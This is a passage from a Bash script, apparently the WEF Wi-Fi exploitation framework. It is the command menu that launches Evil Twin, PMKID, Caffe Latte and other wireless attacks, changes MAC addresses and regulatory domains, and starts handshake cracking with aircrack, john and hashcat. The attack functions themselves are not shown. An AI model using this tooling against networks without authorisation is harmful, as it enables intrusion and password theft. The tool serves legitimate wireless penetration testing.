      arp_replay_attack; clear_p=1

    elif [ "$option" == "10" ] || [ "$option" == "hirte" ]; then
      hirte_attack; clear_p=1

    elif [ "$option" == "11" ] || [ "$option" == "caffelatte" ] || [ "$option" == "caffe latte" ]; then
      caffe_latte_attack; clear_p=1

    elif [ "$option" == "12" ] || [ "$option" == "fake" ]; then
      fake_authentication_attack; clear_p=1

    elif [ "$option" == "13" ] || [ "$option" == "passive" ]; then
      passive_capture_attack; clear_p=1

    elif [ "$option" == "14" ] || [ "$option" == "pmkid" ]; then
      check_tools "hcxdumptool" "hcxpcapngtool" "hcxhashtool"
      if [ "$tools_missing" == "true" ]; then
        continue
      fi

      pmkid_attack; clear_p=1

    elif [ "$option" == "15" ] || [ "$option" == "pwnagotchi" ]; then
      check_tools "hcxpcapngtool" "bettercap"
      if [ "$tools_missing" == "true" ]; then
        continue
      fi

      pwnagotchi; clear_p=1

    elif [ "$option" == "16" ] || [ "$option" == "evil" ] || [ "$option" == "eviltwin" ] || [ "$option" == "e" ]; then
      check_tools "hostapd" "hostapd-wpe" "dnsmasq" "lighttpd"
      if [ "$tools_missing" == "true" ]; then
        continue
      fi

      if [ "${airmon_check_kill}" == "false" ]; then
        while true; do
          if [ "$lang" == "en" ]; then
            input_no_line "Evil Twin attack needs killing conflictive processes such as wpa_supplicant and NetworkManager, do you want to proceed? (yes/no): " continue_option
          else
            input_no_line "El ataque Evil Twin necesita matar los procesos conflictivos como wpa_supplicant y NetworkManager, ¿quieres continuar? (si/no): " continue_option
          fi

          if [ "$continue_option" == "si" ] || [ "$continue_option" == "s" ]; then
            evil_twin_attack; clear_p=1
          elif [ "$continue_option" == "no" ] || [ "$continue_option" == "n" ]; then
            break
          else
            log_invalid_option
          fi
        done
      else
        evil_twin_attack; clear_p=1
      fi

    elif [ "$option" == "17" ] || [ "$option" == "auto" ] || [ "$option" == "autopwn" ]; then
      check_tools "reaver" "wash" "hcxdumptool" "hcxpcapngtool" "hcxhashtool"
      if [ "$tools_missing" == "true" ]; then
        continue
      fi

      auto_pwn_attack; clear_p=1

    elif [ "$option" == "18" ] || [ "$option" == "wpa3" ]; then
      check_tools "python3"
      if [ "$tools_missing" == "true" ]; then
        continue
      fi

      wpa3_attack; clear_p=1

    elif [ "$option" == "enable" ] || [ "$option" == "start" ] || [ "$option" == "monitor" ]; then
      if [ "$(check_interface_mode)" == "managed" ]; then
        echo
        enable_mon
      else
        if [ "$lang" == "en" ]; then
          warning_ln "Interface already in monitor mode"
        else
          warning_ln "La interfaz ya está en modo monitor"
        fi
      fi

    elif [ "$option" == "disable" ] || [ "$option" == "stop" ]; then
      if [ "$(check_interface_mode)" == "monitor" ]; then
        disable_mon
      else
        if [ "$lang" == "en" ]; then
          warning_ln "Interface already in managed mode"
        else
          warning_ln "La interfaz ya está en modo managed"
        fi
      fi

    elif [ "$option" == "mac" ] || [ "$option" == "random" ] || [ "$option" == "randomize" ]; then
      randomize_mac

      mac_randomized="true"
      macchanger_output="$(macchanger -s ${monitor_interface})"
      current_mac=$(echo -e "${macchanger_output}" | grep "Current" | awk '{print $3}') # Get new MAC address
      current_vendor="($(echo -e "${macchanger_output}" | grep "Current" | awk '{print $2}' FS="(")" # Get vendor from "macchanger" output
      
      if [ "$lang" == "en" ]; then
        success "New MAC: ${current_mac} ${current_vendor}"
      else
        success "Nueva dirección MAC: ${current_mac} ${current_vendor}"
      fi

    elif [ "$(echo $option | awk '{print $1}')" == "reg" ]; then
      country_code="$(echo $option | awk '{print $2}')"

      if [ "${country_code}" ]; then
        if [ ! "$(echo -e "${regulatory_domains_list}" | grep -i "${country_code}")" ]; then
          if [ "$lang" == "en" ]; then
            warning_ln "The provided option is not a valid country code"
          else
            warning_ln "La opción proporcionada no es un codigo de país válido"
          fi
          continue
        fi

        current_regulatory_domain="$(iw reg get | grep -xA1 'global' | uniq | grep 'country' | awk -F' ' '{print $2}' | awk -F':' '{print $1}')"

        if [ "$lang" == "en" ]; then
          status_ln "Current regulatory domain is: ${current_regulatory_domain}"
        else
          status_ln "Tu dominio regulatorio actual es: ${current_regulatory_domain}"
        fi

        iw reg set "${country_code}"

        if [ $? -eq 0 ]; then
          if [ "$lang" == "en" ]; then
            success "Regulatory domain successfully changed to ${country_code}"
          else
            success "El dominio regulatorio ha sido cambiado a ${country_code} correctamente"
          fi
        else
          if [ "$lang" == "en" ]; then
            failed "The regulatory domain has not been changed"
          else
            failed "No se ha podido cambiar el dominio regulatorio"
          fi
        fi
      else
        if [ "$lang" == "en" ]; then
          info_ln "A valid country code is needed"
          info "Example: reg JP"
        else
          info_ln "Se necesita un codigo de pais válido"
          info "Ejemplo: reg JP"
        fi
      fi

    elif [ "$option" == "check_vif" ]; then
      if [ "$(check_vif)" ]; then
        if [ "$lang" == "en" ]; then
          success_ln "${monitor_interface} seems to support VIF (Virtual Interface)"
        else
          success_ln "${monitor_interface} parece soportar VIF (Interfaz Virtual)"
        fi
      else
        if [ "$lang" == "en" ]; then
          warning_ln "${monitor_interface} does not seem to support VIF (Virtual Interface)"
        else
          warning_ln "${monitor_interface} no parece soportar VIF (Interfaz Virtual)"
        fi
      fi

    elif [ "$option" == "scan" ]; then
      echo
      scan_aps

    elif [ "$option" == "list" ] || [ "$option" == "list_aps" ]; then
      echo
      if [ -f "${cache_path}/airodump-01.csv" ]; then
        if [ "$lang" == "en" ]; then
          info_ln "Parsing information about the APs and their clients...\n"
        else
          info_ln "Parseando la informacion sobre los APs y sus clientes...\n"
        fi
        sleep 0.1

        format_csv_info
      else
        if [ "$lang" == "en" ]; then
          warning "No available APs scan found. Use \"scan\" to scan nearby APs"
        else
          warning "No hay ningún escaneo de APs disponible. Usa \"scan\" para escanear los APs cercanos"
        fi
      fi

    elif [ "$(echo $option | awk '{print $1}')" == "graph" ]; then
      csv_file="$(echo "${option}" | awk '{print $2}')"
      output_file="$(echo "${option}" | awk '{print $3}')"

      if [ "${csv_file}" ] && [ -f "${csv_file}" ] && [ "${output_file}" ]; then
        echo
        create_graph_file "${csv_file}" "${output_file}"
      elif [ "${csv_file}" ] && [ ! -f "${csv_file}" ]; then
        if [ "$lang" == "en" ]; then
          warning_ln "Especified csv file does not exist"
        else
          warning_ln "Archivo csv especificado no existe"
        fi
      else
        if [ "$lang" == "en" ]; then
          info_ln "Usage example: graph capture.csv graph.png"
        else
          info_ln "Ejemplo de uso: graph captura.csv gráfico.png"
        fi
      fi

    elif [ "$(echo $option | awk '{print $1}')" == "check" ]; then
      capture_file="$(echo $option | awk '{print $2}')"

      if [ ! "$capture_file" ]; then
        if [ "$lang" == "en" ]; then
          info_ln "Usage: check /path/to/handshake.cap"
        else
          info_ln "Uso: check /ruta/del/handshake.cap"
        fi
      elif [ -f "${capture_file}" ]; then
        print_available_handshakes "${capture_file}"
      else
        if [ "$lang" == "en" ]; then
          warning_ln "Especified file does not exist"
        else
          warning_ln "El archivo especificado no existe"
        fi
      fi

    elif [ "$(echo $option | awk '{print $1}')" == "check_online" ]; then
      check_handshakes_online

    elif [ "$(echo $option | awk '{print $1}')" == "crack" ]; then
      capture_file="$(echo "$option" | awk '{print $2}')"
      wordlist_to_use="$(echo "$option" | awk '{print $3}')"

      launch_cracking_process "aircrack"

    elif [ "$(echo $option | awk '{print $1}')" == "crack_online" ]; then
      capture_file="$(echo "$option" | awk '{print $2}')"

      if [ "${capture_file}" ] && [ -f "${capture_file}" ]; then
        crack_handshake_online "${capture_file}"
      else
        if [ "$lang" == "en" ]; then
          warning_ln "Usage: crack_online /path/to/handshake.cap"
        else
          warning_ln "Uso: crack_online /ruta/del/handshake.cap"
        fi
      fi

    elif [ "$(echo $option | awk '{print $1}')" == "john" ]; then
      check_tools "john" "wpapcap2john"
      if [ "${tools_missing}" == "true" ]; then
        continue
      fi

      capture_file="$(echo "$option" | awk '{print $2}')"
      wordlist_to_use="$(echo "$option" | awk '{print $3}')"

      launch_cracking_process "john"

    elif [ "$(echo $option | awk '{print $1}')" == "hashcat" ]; then
      check_tools "hashcat" "hcxpcapngtool"
      if [ "$tools_missing" == "true" ]; then
        continue
      fi

      capture_file="$(echo "$option" | awk '{print $2}')"
      wordlist_to_use="$(echo "$option" | awk '{print $3}')"

      launch_cracking_process "hashcat"

    elif [ "$(echo $option | awk '{print $1}')" == "convert" ]; then
      echo
      if [ ! "$(command -v hcxpcapngtool)" ]; then
        log_command_not_found "hcxpcapngtool"
        continue
      fi

      capture_file="$(echo "$option" | awk '{print $2}')"
      output_file="$(echo "$option" | awk '{print $3}')"
      if [ "$capture_file" ] && [ "$output_file" ]; then
        hcxpcapngtool -o "${output_file}" "${capture_file}" &>/dev/null
        if [ "$lang" == "en" ]; then
          success "File converted successfully"
        else
          success "Archivo convertido correctamente"
        fi
      else
        if [ "$lang" == "en" ]; then
          info "Usage example: convert /path/to/capture.cap output.hc22000"
        else
          info "Ejemplo de uso: convert /ruta/de/la/captura.cap output.hc22000"
        fi
      fi

    elif [ "$(echo $option | awk '{print $1}')" == "identify" ]; then
      mac_to_identify="$(echo "$option" | awk '{print $2}')"

      if [ "${mac_to_identify}" ]; then
        vendor_to_identify="$(get_vendor_by_mac "${mac_to_identify}")"

        if [ "$vendor_to_identify" ]; then
          info_ln "Vendor: ${vendor_to_identify}"
        else
          info_ln "Vendor: unknown"
        fi
      else
        if [ "$lang" == "en" ]; then
          info_ln "Usage example: identify 00:c0:ca:b0:23:84"
        else
          info_ln "Ejemplo de uso: identify 00:c0:ca:b0:23:84"
        fi
      fi

    elif [ "$option" == "info" ] || [ "$option" == "status" ]; then
      echo
      print_interface_name_2
      print_interface_mode_2
      print_mac_address_2
      print_chipset
      print_freq_band
      print_vif

    elif [ "$option" == "panel" ]; then
      attacks_panel

    elif [ "$option" == "attacks" ]; then
      log_functions_info

    elif [ "$option" == "chipsets" ] || [ "$option" == "chipset" ]; then
      chipsets_panel

    elif [ "$option" == "update" ]; then
      if [ "$lang" == "en" ]; then
        info_ln "Checking the latest version"
      else
        info_ln "Comprobando la última versión"
      fi
      sleep 0.2
      if [ "$(curl -s -X GET 'https://raw.githubusercontent.com/D3Ext/WEF/main/src/version.txt')" != "${program_version}" ]; then
        while true; do
          if [ "$lang" == "en" ]; then
            success "New version found"
            input_no_line "Do you want to update WEF? (yes/no): " update_option
          else
            success "Nueva versión encontrada"
            input_no_line "¿Quieres actualizar WEF? (si/no): " update_option
          fi

          if [ "$update_option" == "y" ] || [ "$update_option" == "yes" ] || [ "$update_option" == "s" ] || [ "$update_option" == "si" ]; then
            run_update

            if [ "$lang" == "en" ]; then
              success "Update completed successfully"
              warning "Execute WEF again to use the new version"
            else
              success "Actualización completada correctamente"
              warning "Ejecuta de nuevo WEF para utilizar la nueva versión"
            fi

            exit 0
          elif [ "$update_option" == "n" ] || [ "$update_option" == "no" ]; then
            break
          else
            log_invalid_option
          fi
        done
      else
        if [ "$lang" == "en" ]; then
          status "This is the latest version"
        else
          status "Esta es la ultima versión"
        fi
      fi

    elif [ "$option" == "edit" ]; then
      editor=$(echo $EDITOR)

      if [ "${editor}" ]; then
        ${editor} "${config_file}"
      else
        nano "${config_file}"
      fi

    elif [ "$option" == "clear" ] || [ "$option" == "cls" ]; then
      clear_screen

    elif [ "$option" == "version" ]; then
      if [ "$lang" == "en" ]; then
        echo -e "\n${grayC}wef v${program_version} for linux (https://github.com/D3Ext/WEF)${endC}"
        echo -e "${grayC}Created by D3Ext <d3ext@proton.me>${end}"
      else
        echo -e "\n${grayC}wef v${program_version} para linux (https://github.com/D3Ext/WEF)${endC}"
        echo -e "${grayC}Creado por D3Ext <d3ext@proton.me>${endC}"
      fi

    elif [ "$option" == "exit" ] || [ "$option" == "quit" ] || [ "$option" == "salir" ]; then
      exit_wef

    elif [ "$option" == "help" ] || [ "$option" == "?" ]; then
      commands_panel

    else # Finally enter in this case if the command is invalid
      if [ "$lang" == "en" ]; then
        warning_ln "Unknown command, type ${yC}help${endC}"
      else
        warning_ln "Comando inválido, escribe ${yC}help${endC}"
      fi
    fi
  done
}

main_menu


